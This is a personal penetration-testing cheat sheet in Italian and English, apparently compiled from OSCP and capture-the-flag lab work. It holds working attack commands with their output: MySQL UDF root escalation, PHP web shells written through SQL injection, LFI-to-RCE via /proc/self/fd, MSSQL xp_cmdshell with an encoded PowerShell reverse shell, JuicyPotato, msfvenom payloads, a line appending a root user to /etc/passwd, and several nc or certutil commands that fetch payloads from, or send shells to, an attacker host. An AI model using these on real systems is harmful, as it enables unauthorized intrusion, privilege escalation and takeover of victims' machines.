Type 'help;' or '\h' for help. Type '\c' to clear the buffer.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema | 
| members            | 
| mysql              | 
+--------------------+
3 rows in set (0.00 sec)

mysql> select sys_exec('usermod -a -G admin john');
+--------------------------------------+
| sys_exec('usermod -a -G admin john') |
+--------------------------------------+
| NULL                                 | 
+--------------------------------------+
1 row in set (0.08 sec)
```


Con questa vuln, si potrebbe anche pensare di fare uno compilato per settare i suid di root:
```
john@Kioptrix4:~$ cd /tmp
john@Kioptrix4:/tmp$ cat setuid.c
int main()
{
     setgid(0);
     setuid(0);
     system("/bin/bash");
}
john@Kioptrix4:/tmp$ gcc -o setuid setuid.c
The program 'gcc' can be found in the following packages:
* gcc
* pentium-builder
Ask your administrator to install one of them
bash: gcc: command not found

root@kali:~# cat setuid.c
int main()
{
     setgid(0);
     setuid(0);
     system("/bin/bash");
}
root@kali:~# gcc -o setuid setuid.c -m32
root@kali:~# python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
172.16.119.135 - - [15/May/2015 08:28:52] "GET /setuid HTTP/1.0" 200 -

john@Kioptrix4:/tmp$ rm setuid.c
john@Kioptrix4:/tmp$ wget http://172.16.119.128:8000/setuid
--10:28:54--  http://172.16.119.128:8000/setuid
           => `setuid'
Connecting to 172.16.119.128:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5,072 (5.0K) [application/octet-stream]

100%[====================================>] 5,072         --.--K/s            

10:28:54 (711.75 MB/s) - `setuid' saved [5072/5072]

john@Kioptrix4:/tmp$ ls -al
total 20
drwxrwxrwt  3 root root 4096 2015-05-15 10:28 .
drwxr-xr-x 21 root root 4096 2012-02-06 18:41 ..
-rw-r--r--  1 john john 5072 2015-05-15 08:28 setuid
drwxr-xr-x  2 root root 4096 2015-05-15 08:35 .winbindd

john@Kioptrix4:/tmp$ mysql -u root
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 38
Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)

Type 'help;' or '\h' for help. Type '\c' to clear the buffer.

mysql> select sys_exec('chown root:root /tmp/setuid; chmod 4755 /tmp/setuid');
+-----------------------------------------------------------------+
| sys_exec('chown root:root /tmp/setuid; chmod 4755 /tmp/setuid') |
+-----------------------------------------------------------------+
| NULL                                                            |
+-----------------------------------------------------------------+
1 row in set (0.00 sec)

mysql> exit
Bye
john@Kioptrix4:/tmp$ ./setuid
root@Kioptrix4:/tmp# id
uid=0(root) gid=0(root) groups=1001(john)
```

Questo se la funzione **sys_exec** è già definita perchè c'è il binario lib_mysqludf_sys.so. Se non è definita e non c'è quel binario, si può fare così:
```
mysql> use mysql;
use mysql;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> create table npn(line blob);
create table npn(line blob);
Query OK, 0 rows affected (0.02 sec)

mysql> insert into npn values(load_file('/var/www/html/lib_mysqludf_sys_64.so'));
insert into npn values(load_file('/var/www/html/lib_mysqludf_sys_64.so'));
Query OK, 1 row affected (0.01 sec)

mysql> select * from npn into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys_64.so'
select * from npn into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys_64.so';
Query OK, 1 row affected (0.00 sec)

mysql> create function sys_exec returns integer soname 'lib_mysqludf_sys_64.so';
create function sys_exec returns integer soname 'lib_mysqludf_sys_64.so';
Query OK, 0 rows affected (0.01 sec)

mysql> select sys_exec('nc 192.168.49.193 22 -e /bin/bash');
select sys_exec('nc 192.168.49.193 22 -e /bin/bash');

```

I binari (sia Linux che Windows) li trovi in https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql


**Altro modo usando raptor_udf2.c**
(Writeup lab: Fw_dev)
- MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)
https://www.exploit-db.com/exploits/1518

Praticamente si possono eseguire comandi come root, quindi si può creare un secondo utente root e accedere con quello.
```
* Usage:
* $ id
* uid=500(raptor) gid=500(raptor) groups=500(raptor)
* $ gcc -g -c raptor_udf2.c
* $ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
* $ mysql -u root -p
* Enter password:
* [...]
* mysql> use mysql;
* mysql> create table foo(line blob);
* mysql> insert into foo values(load_file('/home/raptor/raptor_udf2.so'));
* mysql> select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
* mysql> create function do_system returns integer soname 'raptor_udf2.so';
* mysql> select * from mysql.func;
* +-----------+-----+----------------+----------+
* | name      | ret | dl             | type     |
* +-----------+-----+----------------+----------+
* | do_system |   2 | raptor_udf2.so | function |
* +-----------+-----+----------------+----------+
* mysql> select do_system('id > /tmp/out; chown raptor.raptor /tmp/out');
* mysql> \! sh
* sh-2.05b$ cat /tmp/out
* uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm)
```


**you can inject php shell here**
```
$ mysql> Select "<?php echo shell_exec($_GET['cmd']);?>" into outfile "/var/www/https/blogblog/wp-content/uploads/shell.php";
```

Trovato da un writeup (esegue reverse shell, utilizzando mknod inserendolo nel parametro cmd del file .php che ha caricato prima)
Browsing to the file, as with part 4, I did not get any feedback from running commands such as /phpmyadmin_shell.php?cmd=whoami however I was able to obtain a reverse shell connection using mknod:
```
mknod /tmp/backpipe p; nc 192.168.110.129 8444 0/tmp/backpipe
```


### LFI
https://blog.g0tmi1k.com/2012/02/kioptrix-level-4-local-file/

https://www.doyler.net/security-not-included/kioptrix-level-1-3-4-walkthrough

```
// Burp -> target -> site map -> http://192.168.0.4 -> checklogin.php -> Right click: myusername=user&mypassword=password -> Send to repeater
// Burp -> repeater -> 2 -> go                                          # Content-Length: 109. HTTP/1.1:200. (AKA Response doesn't have no phpsessid)
// Burp -> repeater -> 2 -> params -> mypassword: ' or 1=1-- - ->  go   # Content-Length: 429. HTTP/1.1:302. (AKA Response: cookie has a phpsessid value)
// Burp -> repeater -> 2 -> params -> new -> cookie -> PHPSESSID:cec3a2499fb7067f170ccfaca1fb7980
// Burp -> repeater -> 2 -> follow redirect -> follow redirect -> params -> url -> username: index.php -> go
// Burp -> repeater -> 2 -> params -> url -> username: index.php%00 -> go
// Burp -> repeater -> 2 -> params -> url -> username: /etc/passwd%00 -> go
// Burp -> repeater -> 2 -> params -> url -> username: /etc/etc/passwd%00 -> go
// Burp -> repeater -> 2 -> params -> url -> username: /proc/self/cmdline%00 -> go
// Burp -> (toolbar) repeater -> action -> sent to: intruder
// Burp -> intruder -> position -> clear § -> GET /member.php?username=/proc/self/fd/§id%00§ HTTP/1.1
// Burp -> intruder -> payload -> numbers -> from: 0 -> to: 10 -> Step: 1
// Burp -> (toolbar) intruder -> start attack
// Burp -> response  # 9
// Burp -> repeater -> 2 -> < -> < -> < -> < -> < -> < -> < -> remove: PHPSESSID -> mypassword: ' or 1=1-- - <?php phpinfo(); ?> -> go
// Burp -> repeater -> 2 -> params -> new -> cookie -> PHPSESSID:9d64e60834f145250acc4ad08ca3eabc -> go -> follow redirct -> follow redirct
// Firefox -> http://192.168.0.4/member.php?username=/proc/self/fd/9%00
// Burp -> repeater -> 2 -> < -> < -> < -> remove: PHPSESSID -> mypassword: ' or 1=1-- <?php echo "\n\n"; passthru($_GET['cmd']); ?> -> go
// Burp -> repeater -> 2 -> params -> new -> cookie -> PHPSESSID:a513efb8691a7f125a6c80af573eae25 -> go -> follow redirct -> follow redirct
curl --cookie "PHPSESSID=a513efb8691a7f125a6c80af573eae25" "http://192.168.0.4/member.php?username=/proc/self/fd/9%00&cmd=id"
curl --cookie "PHPSESSID=a513efb8691a7f125a6c80af573eae25" "http://192.168.0.4/member.php?username=/proc/self/fd/9%00&cmd=whereis%20netcat"

nc -lvvp 443

curl --cookie "PHPSESSID=a513efb8691a7f125a6c80af573eae25" "http://192.168.0.4/member.php?username=/proc/self/fd/9%00&cmd=/bin/nc.traditional%20192.168.0.192%20443%20-e%20/bin/sh"
```

Spettacolo, praticamente usa il parametro username per leggere il contenuto di /etc/proc/fd/9 in cui viene loggato quello che inserisce l'utente al login. Quindi utilizza i log per fare una reverse shell



### JohnTheRipper
To crack a RAR:
```
rar2john MSSQL_BAK.rar > hash
```

To crack a PDF:
```
/usr/share/john/pdf2john.pl Infrastructure.pdf > hash
```
(se non sembra andare, vedi se magari scaricando il file si è corrotto,magari in ftp non hai usato bin prima di scaricarlo
altrimenti puoi usare ```perl ~/Programs/john-bleeding-jumbo/run/pdf2john.pl Infrastructure.pdf > hash```)

```
john --wordlist=~/Documents/rockyou.txt hash
```

### Powershell
Per eseguire una richiesta web e vedere la risposta:
```
PS C:\> $Resp = Invoke-WebRequest -Uri "http://nickel/?localgroup Administrators ariah /add" -UseBasicParsing
PS C:\> $Resp.RawCOntent
```


### SQLServer
Login:
```
(base) ┌──(kali㉿kali)-[~/Documents/ProvingGrounds]
└─$ mssql-cli -S 192.168.128.70,1435 -U sa -P EjectFrailtyThorn425
master> 
```

Esecuzione comandi con xp_cmdshell
Carico nc.exe
```
master> xp_cmdshell 'powershell -nop -exec bypass -c "IEX(New-Object System.Net.WebClient).DownloadFile(
....... \"http://192.168.49.128:1221/nc.exe\", \"C:\Users\Public\nc.exe\")"'                            
Time: 1.823s (a second)
+------------------------------------------------------------------------------------------------------>
| output                                                                                               >
|------------------------------------------------------------------------------------------------------>
| Invoke-Expression : Cannot bind argument to parameter 'Command' because it is null.                  >
| At line:1 char:4                                                                                     >
| + IEX(New-Object System.Net.WebClient).DownloadFile("http://192.168.49. ...                          >
| +    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                              >
|     + CategoryInfo          : InvalidData: (:) [Invoke-Expression], ParameterBindingValidationExcepti>
|     + FullyQualifiedErrorId : ParameterArgumentValidationErrorNullNotAllowed,Microsoft.PowerShell.Com>
|    ssionCommand                                                                                      >
|                                                                                                      >
| NULL                                                                                                 >
+------------------------------------------------------------------------------------------------------>
(9 rows affected)
```

Anche se mi dà errore lo ha caricato (ho fatto un dir sempre con xp_cmdshell)
Eseguo reverse shell:
```
master> xp_cmdshell 'C:\Users\Public\nc.exe 192.168.49.128 80 -e cmd.exe' 
```

Se xp_cmdshell dovesse dare problemi:
https://www.mssqltips.com/sqlservertip/1020/enabling-xpcmdshell-in-sql-server/
Esempio (preso da lab OSCP: Ralph):
```
 1> EXEC master..xp_cmdshell 'whoami'
    2> go
    Msg 15281, Level 16, State 1
    Server 'RALPH\SQLEXPRESS', Procedure 'master..xp_cmdshell', Line 1
    SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is
    turned off as part of the security configuration for this server. A system administrator can enable the use of
    'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell'
    in SQL Server Books Online.

To fix this error, (https://www.mssqltips.com/sqlservertip/1020/enabling-xpcmdshell-in-sql-server/) run:

    1> sp_configure 'show advanced options', '1'
    2> RECONFIGURE
    3> go
    Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
    (return status = 0)
    1> sp_configure 'xp_cmdshell', '1' 
    2> RECONFIGURE
    3> go
    Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
    (return status = 0)

And we can run command:

    1> xp_cmdshell 'whoami'
    2> go
```


#### Con SQLi
(Vedi Dj writeup dell'OSCP)
Volendo si può concatenare nella SQLi con EXEC e dargli xp_cmdshell per eseguire comando. Se non si hanno credenziali per accedere al db ma si ha una SQLi.
```
We can use xp_cmdshell to run command, but first we must abilitate:

' UNION SELECT NULL,NULL; EXEC sp_configure 'show advanced options', 1; -- 
' UNION SELECT NULL,NULL; RECONFIGURE; --
' UNION SELECT NULL,NULL; EXEC sp_configure 'xp_cmdshell', 1; --
' UNION SELECT NULL,NULL; RECONFIGURE; --

We run the ping to test:
' UNION SELECT NULL,NULL; EXEC xp_cmdshell 'ping 192.168.119.168'; --

We receive the ping:

## Access
We can use powershell to do a reverse shell:

    ' UNION SELECT NULL,NULL; EXEC xp_cmdshell 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEAMQA5AC4AMQA2ADgAIgAsADcANwA3ADcAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'; --
```


### Tips & Trick
- Al post del comando "ls" si può usare "echo \*" per listare il contenuto di una cartella

- echo "root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash" >> /etc/passwd

- Invertire un file ```tac fsocity.dic > fsocity.dic.reverse```


### Upload 
- Windows

powershell -c "Invoke-WebRequest -Uri 'http://192.168.49.199/accesschk.exe' -OutFile 'accesschk.exe'"

powershell -command "(New-Object System.Net.WebClient).DownloadFile('http://192.168.118.3:21/win.exe', 'C:\Users\daisy\Desktop\win.exe')"

Se si hanno le credenziali ssh:
scp shell.exe ariah@192.168.231.99:C:\\users\\ariah\\desktop\\shell.exe

### Worpress

Let's scan workpress
$ wpscan --disable-tls-checks --url https://192.168.190.131:12380/blogblog/ --enumerate u
$ wpscan --disable-tls-checks --url https://192.168.190.131:12380/blogblog/ --enumerate p
$ wpscan --url https://192.168.1.13:12380/blogblog/ --enumerate uap

#### wordpress advanced video

searchsploit wordpress advanced video

$ cat /usr/share/exploitdb/platforms/php/webapps/39646.py

edit the script to the wordpress ip and folder 
then execute 

then go to https://192.168.190.131:12380/blogblog/wp-content/uploads/
and download the image 520019578.jpeg



#### Change Shell 
then i changed the shell 

```
$ sudo usermod -s /bin/bash peter
$ sudo -i
```

Man **usermod**:
-s, --shell SHELL
    The name of the user's new login shell. Setting this field to blank causes the system to select the default login shell. 

Man **sudo**:
-i [command]
The -i (simulate initial login) option runs the shell specified by the password database entry of the target user as a login shell. This means that login-specific resource files such as .profile or .login will be read by the shell. If a command is specified, it is passed to the shell for execution via the shell's -c option. If no command is specified, an interactive shell is executed. sudo attempts to change to that user's home directory before running the shell. The security policy shall initialize the environment to a minimal set of variables, similar to what is present when a user logs in. The Command Environment section in the sudoers(5) manual documents how the -i option affects the environment in which a command is run when the sudoers policy is in use. 





### SSL error (script python, per https)

Upon downloading the exploit, and running it, I was presented with an SSL error… So I went ahead and edited the code to include the following

```
import ssl
ssl._create_default_https_context = ssl._create_unverified_context
```

vedi anche: https://github.com/gtech/39646/blob/master/39646.py



### Recursive cat
find -name ".bash_history" -exec cat {} \;


### Linux Kernel 4.4.x (Ubuntu 16.04) – double-fdput() in bpf(BPF_PROG_LOAD) Local Root Exploit (http://www.mrb3n.com/?p=81)

This particular kernel version appeared to be vulnerable to the following kernel exploit: https://www.exploit-db.com/exploits/39772/



### Windows Exploits (alcuni)

https://github.com/WindowsExploits/Exploits


### Certutil (Windows - per download)

certutil -urlcache -split -f "http://$IP/$FILE" $NOME_FILE


### JuicyPotato
Spiegazione presa da (https://www.youtube.com/watch?v=gz3_qRL0JJo)

Vedi anche: https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/juicypotato

https://github.com/ohpe/juicy-potato
https://github.com/ohpe/juicy-potato/releases

Puoi eseguire semplicemente: (è più semplice e poi se per esempio non c'è poweshell per lo script shell.ps1)
```
jp.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\wamp\www\nc.exe -e cmd.exe 192.168.49.114 3389" -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
```

Prima si mette in ascolto la mia macchina (nc -lnvp 443), poi si fa l'upload di JuicyPotato.exe e di shell.bat sulla macchina vittima e poi si esegue sulla macchina vittima:
```
JuicyPotato.exe -l 443 -p shell.bat -t *
```

In shell.bat:
```
powershell -c "IEX((New-Object System.Net.WebClient).DownloadString('http://$IP/shell.ps1'))"
```

In shell.ps1: (è una reverse shell, presa da https://github.com/Dhayalanb/windows-php-reverse-shell/blob/master/Reverse%20Shell.php)


Oppure si può uploadare nc.exe e scrivere semplicemente in shell.ps1:
```
nc.exe -e cmd.exe $IP $PORT
``` 

Volendo, se si volesse eseguire una command line (senza un file shell.bat), si può fare:
```
JuicyPotato.exe -l 443 -p C:\Windows\system32\cmd.exe -t *
```

Se dovesse dare errore, potrebbe ssere perchp si deve settare il CLSID (si prende dal link di JuicyPotato (con tutte le parentesi graffe), in base alla versione del sistema) e poi si setta:

L'errore è **COM -> recv failed with error: 10038**

```
JuicyPotato.exe -l 443 -p shell.bat -t * -c  "$CLSID"
```

C'è anche uno script powershell per trovare il CLSID https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1
In questo link https://medium.com/r3d-buck3t/impersonating-privileges-with-juicy-potato-e5896b20d505 viene usato ma solo la prima parte!


- Per questa vuln esiste anche PrintSpoofer https://github.com/itm4n/PrintSpoofer


#### Esempio

Sulla mia macchina mi metto nel path **~/Programs/JuicyPotato** e avvio server python (così posso uploadare i file che mi servono sulla macchina vittima)
```
┌──(kali㉿kali)-[~/Programs/JuicyPotato]
└─$ sudo python -m SimpleHTTPServer 80
```

Poi avvio anche un listener (che mi servirà quando eseguo JuicyPotato):
```
nc -lnvp 4444
```

N.B. 
	- Nello script **shell.bat** bisogna modificare IP e PORT che devono essere quelli del server python
	- Nello script **shell.ps1** nell'ultima riga bisogna modificare IP e PORT perchè è questo che crea la reverse shell

shell.ps1 https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1

Macchina vittima:

```
PS C:\Users\bruce> certutil -urlcache -split -f "http://10.8.80.159/JuicyPotato.exe" jp.exe

****  Online  ****
  000000  ...
  054e00
CertUtil: -URLCache command completed successfully.
PS C:\Users\bruce> PS C:\Users\bruce> certutil -urlcache -split -f "http://10.8.80.159/shell.bat" shell.bat
****  Online  ****
  0000  ...
  0065
CertUtil: -URLCache command completed successfully.
PS C:\Users\bruce> certutil -urlcache -split -f "http://10.8.80.159/shell.ps1" shell.ps1
****  Online  ****
  0000  ...
  1128
CertUtil: -URLCache command completed successfully.
PS C:\Users\bruce> dir


    Directory: C:\Users\bruce


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
d----        10/25/2019   8:05 PM            .groovy                           
d-r--        10/25/2019   9:51 PM            Contacts                          
d-r--        10/25/2019  11:22 PM            Desktop                           
d-r--        10/26/2019   4:43 PM            Documents                         
d-r--        10/26/2019   4:43 PM            Downloads                         
d-r--        10/25/2019   9:51 PM            Favorites                         
d-r--        10/25/2019   9:51 PM            Links                             
d-r--        10/25/2019   9:51 PM            Music                             
d-r--        10/25/2019  10:26 PM            Pictures                          
d-r--        10/25/2019   9:51 PM            Saved Games                       
d-r--        10/25/2019   9:51 PM            Searches                          
d-r--        10/25/2019   9:51 PM            Videos                            
-a---          6/2/2021   3:28 PM     347648 jp.exe                            
-a---          6/2/2021   3:29 PM        101 shell.bat                         
-a---          6/2/2021   3:29 PM       4392 shell.ps1                         


PS C:\Users\bruce> .\jp.exe -l 4444 -p shell.bat -t *
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 4444
COM -> recv failed with error: 10038
PS C:\Users\bruce> systeminfo

Host Name:                 ALFRED
OS Name:                   Microsoft Windows 7 Ultimate 
OS Version:                6.1.7601 Service Pack 1 Build 7601
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          bruce
Registered Organization:   
Product ID:                00426-OEM-9154295-64842
Original Install Date:     10/25/2019, 9:51:08 PM
System Boot Time:          6/2/2021, 3:22:00 PM
System Manufacturer:       Xen
System Model:              HVM domU
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~2394 Mhz
BIOS Version:              Xen 4.2.amazon, 8/24/2006
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC) Dublin, Edinburgh, Lisbon, London
Total Physical Memory:     2,048 MB
Available Physical Memory: 1,184 MB
Virtual Memory: Max Size:  4,095 MB
Virtual Memory: Available: 3,107 MB
Virtual Memory: In Use:    988 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 1 Hotfix(s) Installed.
                           [01]: KB976902
Network Card(s):           1 NIC(s) Installed.
                           [01]: AWS PV Network Device
                                 Connection Name: Local Area Connection 2
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.10.0.1
                                 IP address(es)
                                 [01]: 10.10.107.63
                                 [02]: fe80::29a7:2281:ed40:a2b9

PS C:\Users\bruce> .\jp.exe -l 4444 -p shell.bat -t * -c "{555F3418-D99E-4E51-800A-6E89CFD8B1D7}"
Testing {555F3418-D99E-4E51-800A-6E89CFD8B1D7} 4444
......
[+] authresult 0
{555F3418-D99E-4E51-800A-6E89CFD8B1D7};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```



Se voglio eseguire lo script per trovare i CLSID, ho una versione semplificata rispetto a quella che si trova sul github di JuicyPotato
Il file si trova in **~/Programs/JuicyPotato/getCLSID_semplificato.ps1**

Dalla macchina vittima:

```
PS C:\Users\bruce> certutil -urlcache -split -f "http://10.8.80.159/getCLSID_semplificato.ps1" getCLSID.ps1
****  Online  ****
  0000  ...
  011c
CertUtil: -URLCache command completed successfully.
PS C:\Users\bruce> .\getCLSID.ps1

WARNING: column "CurrentLocation" does not fit into the display and was removed
.

Name           Used (GB)     Free (GB) Provider      Root                      
----           ---------     --------- --------      ----                      
HKCR                                   Registry      HKEY_CLASSES_ROOT         
Looking for CLSIDs
{00021401-0000-0000-C000-000000000046}
{000C101C-0000-0000-C000-000000000046}
{0010890e-8789-413c-adbc-48f5b511b3af}
{00393519-3A67-4507-A2B8-85146167ACA7}
{00597829-82CE-44d4-8B0B-40BE695973B5}
{00BC7EAE-28D5-4310-BE9F-11526A7FA37F}
{00f2b433-44e4-4d88-b2b0-2698a0a91dba}
{010911E2-F61C-479B-B08C-43E6D1299EFE}
{0289a7c5-91bf-4547-81ae-fec91a89dec5}
{031EE060-67BC-460d-8847-E4A7C5E45A27}
{0365BE92-BD3F-47f5-8BB6-2EEF7AF5CAE7}
{03837511-098B-11D8-9414-505054503030}

[...]
```


Per questo script, ho avuto un errore:
```
PS C:\Users\bruce> .\getCLSID.ps1
****  Online  ****
  0000  ...
  062c
CertUtil: -URLCache command completed successfully.
PS C:\Users\bruce> Invoke-PowerShellTcp : File C:\Users\bruce\getCLSID.ps1 cannot be loaded becaus
e the execution of scripts is disabled on this system. Please see "get-help abo
ut_signing" for more details.
At line:1 char:119
+ iex (New-Object Net.WebClient).DownloadString('http://10.8.80.159:8000/Invoke
-PowerShellTcp.ps1');Invoke-PowerShellTcp <<<<  -Reverse -IPAddress 10.8.80.159
 -Port 5555
    + CategoryInfo          : NotSpecified: (:) [Write-Error], WriteErrorExcep 
   tion
    + FullyQualifiedErrorId : Microsoft.PowerShell.Commands.WriteErrorExceptio 
   n,Invoke-PowerShellTcp
```

Ho risolto eseguendo il comando ```Set-ExecutionPolicy RemoteSigned``` da **ADMIN** (ovviamente dopo aver eseguito JuicyPotato, ma era per testare lo script). Quindi se dovesse dare questo errore, serve essere admin.


### PrintSpoofer
Per vulnerabilità di SeImpersonatePrivileges

https://github.com/itm4n/PrintSpoofer


### SQLi
Se vuoi altri esempi di macchine che hai fatto, vedi Chris, Mail

https://book.hacktricks.xyz/pentesting-web/sql-injection
https://perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/

Error Based:

http://192.168.128.127:33033/slug?URL=%27%20AND%20extractvalue(rand(),concat(0x3a,version()))%20%20--%20

Mysql2::Error: XPATH syntax error: ':10.4.14-MariaDB'   


Se siscopre di avere una SQLi, si può provare anche ad inserire uno script php per avere una RCE:
```
' UNION SELECT ("<?php echo passthru($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/cmd.php'  -- -'
```

Per testare che effettivamente è stata creata:
```
kali@kali:~$ curl "http://192.168.120.132:45332/cmd.php?cmd=dir"
 Volume in drive C has no label.
 Volume Serial Number is A41E-B108

 Directory of C:\xampp\htdocs

11/09/2020  08:46 AM    <DIR>          .
11/09/2020  08:46 AM    <DIR>          ..
11/09/2020  08:46 AM                35 cmd.php
11/03/2020  11:13 AM               887 index.html
11/03/2020  11:16 AM                21 phpinfo.php
11/03/2020  11:13 AM             3,023 script.js
11/03/2020  11:14 AM             1,266 styles.css
               5 File(s)          5,232 bytes
               2 Dir(s)   1,602,994,176 bytes free
```


E quindi, per esempio, si può creare un payload per una reverse shell, caricare sulla macchina ed eseguirla, tramite lo script php caricato tramite SQLi:
```
kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.118.8 LPORT=30021 -f exe -o reverse.exe      
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: reverse.exe
```

We’ll start a python web server listening on port 45332.
```
kali@kali:~$ python3 -m http.server 45332                
Serving HTTP on 0.0.0.0 port 45332 (http://0.0.0.0:45332/) ...
```

Next, we can use our web shell to download the payload to the target with certutil. Note that we need to URL-encode our command.
```
kali@kali:~$ curl "http://192.168.120.132:45332/cmd.php?cmd=certutil+-f+-urlcache+http://192.168.118.8:45332/reverse.exe+reverse.exe"
****  Online  ****
CertUtil: -URLCache command completed successfully.
```

Let’s start a Netcat listener on port 30021.
```
kali@kali:~$ nc -lvnp 30021
listening on [any] 30021 ...
```

Finally, we will use the web shell to execute our payload.
```
kali@kali:~$ curl "http://192.168.120.132:45332/cmd.php?cmd=reverse.exe"
...
```

The Netcat output indicates that we have received our reverse shell:
```
kali@kali:~$ nc -lvnp 30021
listening on [any] 30021 ...
connect to [192.168.118.8] from (UNKNOWN) [192.168.120.132] 49946
Microsoft Windows [Version 10.0.18363.1139]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs>whoami
whoami
medjed\jerren
```


###BoF

##### Windows
1. Cambiare IP e PORT in fuzzer.py
2. Eseguire fuzzer.py per trovare il numero di bytes per far crashare l'applicativo

3. /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l #bytes_trovati_al_punto_2 + 400

4. Resettare in exploit.py i valori di: (Cambiare anche IP e PORT)
- buffer_size = 0
- offset = 0
- overflow = "A" * offset
- retn = ""
- nop_size = 0
- padding = "" * nop_size
- payload = ""

5. Inserire il valore trovato al punto 2 in **buffer_size** e la stringa generata al punto 3 in **payload**

6. Nella macchina Windows avviare Immunity Debugger con l'applicativo ed eseguire:
- !mona config -set workingfolder c:\mona\%p

7. Eseguire exploit.py

8. Andare nella macchina Windows e l'applicativo ha crashato, eseguire:
- !mona findmsp -distance #bytes_trovati_al_punto_2 + 400

Questo ci darà il valore dell'offset. **N.B prendere offset scritto nella riga dell'EIP**

9. Sostituire il valore dell'offset trovato al punto 8, in exploit.py alla variabile **offset** (LOL, ovviamente xD)

10. Inserire "BBBB" in exploit.py nella variabile **retn** (commentare la riga di codice ```buffer += struct.pack('<I', retn)``` e inserire ```buffer += retn``` altrimenti dà errore)
Questo per testare che effettivamente viene inserito "BBBB" nel return address con l'offset che abbiamo inserito.

11. Trovare i bad character
12. Creare un array di byte su immunity debugger ```!mona bytearray -b "\x00"```
